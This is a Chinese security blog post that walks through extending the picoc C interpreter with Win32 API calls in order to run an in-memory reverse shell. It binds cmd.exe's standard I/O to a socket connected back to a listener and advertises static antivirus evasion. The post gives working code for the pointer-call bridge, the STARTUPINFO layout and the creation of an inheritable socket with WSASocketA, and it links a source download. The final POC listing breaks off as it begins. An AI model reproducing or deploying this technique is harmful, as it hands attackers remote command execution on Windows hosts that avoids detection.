---
title: 工具 | picoc 实战—用 C 语言动态解释实现反弹 shell
url: https://mp.weixin.qq.com/s/CWVzCwmBNjBgZM_a2bjz5A
source: Doonsec's feed
date: 2026-06-20
fetch_date: 2026-06-21T06:48:26.438305
---

# 工具 | picoc 实战—用 C 语言动态解释实现反弹 shell

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JpU6JH8dicqVSz4WSSJC59lOreJpvWItEXrbCg3sUiaDMUCibIn4gFX9YPeR8KBEtEsca1rxvMJKUW1hjyNBFmWUZeQZwwFa4UsehKK1bV1Pzo/0?wx_fmt=jpeg)

# 工具 | picoc 实战—用 C 语言动态解释实现反弹 shell

原创

mimi3389
mimi3389

赛博生存指南

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> picoc 是一个能把 C 源码直接在内存里「动态解释」执行的微型解释器。本文给picoc增加WindowAPI支持，C 在解释器进程里连回监听端、把 `cmd.exe` 的标准输入输出绑到 socket 上，交出一个交互 shell？这篇就亲手把它跑通——全程 loopback，授权测试。
>
> 实际上 CS 4.13 的 beacon 虚拟机已经有大佬当天就实现了。

picoc 还有一重背景：Cobalt Strike 4.13 那套 Beacon Interpreter 的 VM，正是从开源 picoc 重构扩展来的[AI 生成 | Cobalt Strike 4.13 Lost in Translation — Beacon Interpreter 仓库源码解读](https://mp.weixin.qq.com/s?__biz=MzI2Mjk4NjgxMg==&mid=2247484183&idx=1&sn=698b3228fcaad7524539db57f00e8cae&scene=21#wechat_redirect)。所以拿它来跑一次「解释器里执行 C → 反弹 shell」，是最短路径。

制品草稿静态免杀效果如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JpU6JH8dicqXeC8txE28KDonM1aXibgsOe32mEwkI2vJxpxLd3T4bib1tzDge0UXmLNdQcrLyuBrUkYAwKAgQ1EK0Hp84vdWvw4JqScsaJ3Rj4/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/JpU6JH8dicqWjBmeuFbZMdIWRSpMGgFjGibEZMwQWqoUg2q0tqT6qd6eXoYpjzjtqNxuhVB8sAxMYtrag86myTm8KISnKkteTpicUpuRKXBCGU/640?wx_fmt=jpeg&from=appmsg)

源码分享：https://pan.baidu.com/s/1mPTsv-BupR6zzfyjKG91vw?pwd=s5tt

---

## 一、目标：用 picoc 跑一次反弹 shell

一句话目标：**让 picoc 解释执行一段 C 源码，这段源码在解释器进程内连回监听端，把 `cmd.exe` 的标准输入输出绑到 socket 上，交出一个交互 shell。**

整条链路：

```
picoc -s revshell.c  （脚本模式，从顶层语句跑，不需要 main）
        │
        ▼  LoadLibraryA / GetProcAddress  解析 winsock + kernel32 导出
        ▼  dcall(fn, ...)  按指针调用任意 Win32 导出
WSAStartup → WSASocketA → SetHandleInformation(INHERIT)
        → connect(127.0.0.1:4444)
        → STARTUPINFO{ hStd* = socket } → CreateProcessA("cmd.exe", bInheritHandles=TRUE)
        → WaitForSingleObject   （守住进程，让 shell 活着）
```

它跑起来是这样的——右窗 picoc 解释执行 `revshell.c`，左窗 netcat 监听端收到回连，`whoami` 回显 ：

![](https://mmbiz.qpic.cn/mmbiz_jpg/JpU6JH8dicqUUewl3UiapffaSon5yrCria12ic9VszbXDk6ashDx33pIyZh4mS2QP91CBicCrNguNqQhOicRBOTO93GB9dcqQLRGUUicVicDfeVjWqY/640?wx_fmt=jpeg&from=appmsg)

下面两节是底座和机制，**真正的三道坎在四、五、六**，完整 POC 在七。

---

## 二、底座：picoc 是什么

picoc 是一个**微型 C 解释器**（不是编译器）——Zik Saleeba 2009 年起的项目，Joseph Poirier 接手维护至今。它直接在内存里解释 C 源码，核心解释器只有约 **5 千行**（连自带的 C 标准库实现一起约 9 千行）。

它为什么适合做「进程内跑 C」的底座，两个理由：

1. 1. **纯解释，不需要编译工具链**。不像 BOF 那样要在本地 `x86_64-w64-mingw32-gcc` 一通操作，picoc 直接吃 C 源码——写完即跑。
2. 2. **不需要额外分配可执行内存**。它解释执行，不往堆上落一块 RWX。脚本跑在既有解释器里，这条「申请内存 + 改权限 + 执行」的检测线索天然缺失。

（顺带一提：这条线接上更早一篇 《让 beacon 编译》（2026-06-15）[2]，那个系列讨论「怎么把代码弄进运行时」——从**编译后注入**（BOF），到这一篇的**进程内解释**（picoc）。）

---

## 三、关键机制：怎么在 picoc 里调任意 Win32 API

POC 的全部难点，都收敛到一个问题上：**picoc 怎么调用 Windows API。**

picoc 自带一套**内建函数（intrinsic）机制**：把一个原生 C 函数指针和一段 picoc 原型串配对，登记到一张 `struct LibraryFunction[]` 表里，再通过 `IncludeRegister("windows.h", ...)` 注册。脚本里 `#include <windows.h>` 时，这套表就被绑进来。每个内建函数签名固定：

```
void CFunc(struct ParseState *Parser, struct Value *ReturnValue,
           struct Value **Param, int NumArgs);
```

这套机制能让我们注入一批「便利层」API（`MessageBoxA`、`VirtualAlloc`、`Sleep`……每个写法干净、带类型检查）。但这不够——真实场景里要调任意 Win32 导出，一个一个枚举写成内建不现实。更通用、也更贴近实战的做法，是靠**解析 + 指针调用**：`LoadLibraryA` 拿到 DLL，`GetProcAddress` 拿到导出，再拿这个函数指针去调。

问题来了：**picoc 不能通过指针调用函数。** 它的表达式求值器（`expression.c`）里有一道硬门禁，只允许调用 picoc 自己的函数值（`TypeFunction`），原生指针它不认识、不解引用。

所以要在 picoc 里调任意 API，必须自己造一座桥——两张牌：

| picoc 内建 | 角色 |
| --- | --- |
| `LoadLibraryA` / `GetModuleHandleA` / `GetProcAddress` / `FreeLibrary` | **解析层** ——拿到任意 DLL 与导出 |
| `dcall(void *fn, ...)` | **指针调用桥** ——拿到指针后按指针调 |

`dcall` 就是那个"绕过门禁"的桥。它在 x64 上很好实现：x64 下 `int` 和 `void *` 都是 8 字节、只有一种调用约定，所以**所有参数都可以统一按 `intptr_t` 编排**，按元数（0~12）`switch` 分派，把 `fn` cast 成对应元数的函数指针类型调一下：

```
/* void *dcall(void *fn, ...) -- 调一个已解析的原生函数指针 */
void CDcall(struct ParseState *Parser, struct Value *ReturnValue,
            struct Value **Param, int NumArgs)
{
    void *fn = Param[0]->Val->Pointer;
    int n = NumArgs - 1;
    intptr_t a[12], r = 0;
    /* ... 把 n 个变参填进 a[] ... */
    switch (n) {
    case 0: r = ((intptr_t (*)(void))fn)(); break;
    case 1: r = ((intptr_t (*)(intptr_t))fn)(a[0]); break;
    case 2: r = ((intptr_t (*)(intptr_t,intptr_t))fn)(a[0],a[1]); break;
    /* ... 一路到 12 元 ... */
    }
    ReturnValue->Val->Pointer = (void *)r;
}
```

有了 `dcall`，picoc 脚本就能 `LoadLibraryA` + `GetProcAddress` 拿到任意导出，再 `dcall` 调用。

接下来三节，就是造这座桥、以及让 POC 真正跑通时踩的三道坎。

---

## 四、坑一：`dcall` 一带参数就崩 —— picoc 变参的真相

这是最难的一坎，也是最有 picoc 味道的一坎。

**现象**：`dcall(fn)`（0 参数）正常；一旦 `dcall(fn, arg1, arg2)` 带任何参数，立刻段错误。

**第一反应（错的）**：变参嘛，`Param[0]` 是函数指针，`Param[1]`、`Param[2]`…… 不就是各参数吗？按这个下标去读。

错。picoc **不**把变参放进 `Param[]`。它的 `ParamArray`（`expression.c`）是**按固定形参的数量**分配的——`dcall` 的原型里固定形参只有一个（`fn`），所以 `Param[]` 里**只有 `Param[0]`**。你读 `Param[1]` 就是在读越界内存，于是崩。

**真相**：变参被压在 picoc 的**表达式栈**上，紧跟在固定形参后面，连续排布。要拿到它们，得**沿着 `Value` 结构体逐个走过去**——这跟 picoc 自己的 `printf` 实现读 `%s` 参数是一模一样的手法。从 `Param[0]` 起步，按"当前这个 Value 占多大对齐空间"往前推一步，就到下一个参数：

```
/* picoc 把变参连续铺在表达式栈上，不在 Param[] 里。
 * 下标 Param[1..] 会越界——这就是 dcall 带参就崩的根因。
 * 照 cstdlib/stdio.c 里 printf 的走法，沿 Value 结构体逐个推进： */
struct Value *ThisArg = Param[0];
for (i = 0; i < n; i++) {
    ThisArg = (struct Value *)((char *)ThisArg +
        MEM_ALIGN(sizeof(struct Value) + TypeStackSizeValue(ThisArg)));
    a[i] = WinMarshalArg(ThisArg);
}
```

步长就是 `MEM_ALIGN(sizeof(struct Value) + TypeStackSizeValue(ThisArg))`——一个 Value 头加上它那块值存储，对齐到 `MEM_ALIGN`。指针走指针、数组走内联 `ArrayMem`、标量走 `Integer`（`WinMarshalArg` 里按类型分发）。

这个坎印证了关于 picoc 的一句老话：**"这不是标准 C 运行时。"** picoc 的变参语义和宿主 C 不一样，你得按它的栈布局来。修掉它之后，`dcall` 才真正能传参。

---

## 五、坑二：picoc 没有指针算术，怎么写 Win32 结构体

POC 要调 `connect`、`CreateProcessA`，就得在脚本里**亲手拼出 `sockaddr_in`、`STARTUPINFO` 这些结构体**。正常 C 里你会这么写：

```
*((int*)(buf + 60)) = flags;     // 在缓冲区偏移 60 处写一个 int
```

picoc **不支持这个**。它的 C 子集有两道限制：

* • 不能对 `void*`/`char*` 做指针算术（`buf + 60` 报 "invalid operation"）；
* • 不能 `*(int*)(buf+off) = ...` 这种强转型写。

但有三样东西**能用**，足够绕过去：

* • `&buf[off]`——取数组元素的地址，合法；
* • `memcpy(&buf[off], &val, n)`——往那个地址拷 n 字节，合法；
* • picoc 自己的 `struct`——嵌套成员访问、`&member`，都合法。

所以策略就一句话：**把 Win32 结构体当成一块字节缓冲，所有字段都用 `memcpy` 往对应偏移写。** 配一张 x64 布局表照着填：

| 结构体 | 大小 | 关键字段偏移 |
| --- | --- | --- |
| `sockaddr_in` | 16 | `sin_family` @0, `sin_port`@2（**网络序**）, `sin_addr`@4 |
| `STARTUPINFOA` | 104 | `cb` @0, `dwFlags`@60, `hStdInput`@80, `hStdOutput`@88, `hStdError`@96 |
| `PROCESS_INFORMATION` | 24 | `hProcess` @0, `dwProcessId`@16 |

脚本里就这么写（节选）：

```
char si[104]; memset(si, 0, 104);
int cb = 104;   memcpy(&si[0],  &cb, 4);
int fl = 0x100; memcpy(&si[60], &fl, 4);          /* STARTF_USESTDHANDLES */
memcpy(&si[80], &sock, 8);                        /* hStdInput  = sock */
memcpy(&si[88], &sock, 8);                        /* hStdOutput = sock */
memcpy(&si[96], &sock, 8);                        /* hStdError  = sock */
```

`CreateProcessA` 有 10 个参数，超过早期 `dcall` 的 8 元上限——顺手把 `dcall` 的元数封顶从 8 抬到 12，补上 case 9~12。

---

## 六、坑三：socket 必须来自 `WSASocketA`，不是 `socket()`

这一坎最隐蔽，也最经典。

**现象**：用 `socket()` 建连，`SetHandleInformation(sock, INHERIT)` 也设了，`CreateProcessA(..., bInheritHandles=TRUE, ...)` 也传了，启动参数里 `hStdInput/Output/Error` 全指向 socket——**一切看起来都对**，但 `cmd.exe` 一启动就 `exit 1`，socket 上一字节的 shell 输出都没有。

排查花了很久（一度怀疑是 STARTUPINFO 布局错了，专门编了个小程序把 104 字节逐字段打出来核对，全对）。最后定位到根因：

> **`socket()` 返回的句柄，即使打了 INHERIT 标志，也不会真正被子进程继承。** 这是 Winsock 的历史包袱。`CreateProcess` 的 `bInheritHandles` 只继承"真正可继承"的句柄，而 `socket()` 给的句柄默认不是。

**解法**：换成 `WSASocketA`，它返回的句柄才是真正可继承的——这是 Metasploit 反弹 shell 多年的标准做法：

```
/* 必须是 WSASocketA，不是 socket()。
 * socket() 的句柄不真正可继承，cmd.exe 拿不到 stdio，exit 1。 */
void *sock = dcall(fnWSASocket, 2/*AF_INET*/, 1/*SOCK_STREAM*/, 6/*IPPROTO_TCP*/, 0, 0, 0);
dcall(fnSetHandle, sock, 1/*HANDLE_FLAG_INHERIT*/, 1);
```

换上 `WSASocketA`，截图里那次回连就出来了。

---

## 七、完整 POC：`revshell.c`（授权测试 / loopback）

把上面三道坎的解法拼起来，就是完整脚本。解析 winsock 与 kernel32 的导出、建可继承 socket、连回 loopback、把 cmd.exe 的 stdio 绑到 socket：

```
#include <stdio.h>
#include <windows.h>
#include <string.h>

/* AUTHORIZED TESTING ONLY —— 目标 127.0.0.1，仅本地验证。
 * 要点：socket 必须来自 WSASocketA（见坑三），结构体字段全用
 * memcpy 写（见坑二），所有 Win32 调用走 dcall（见坑一/三节...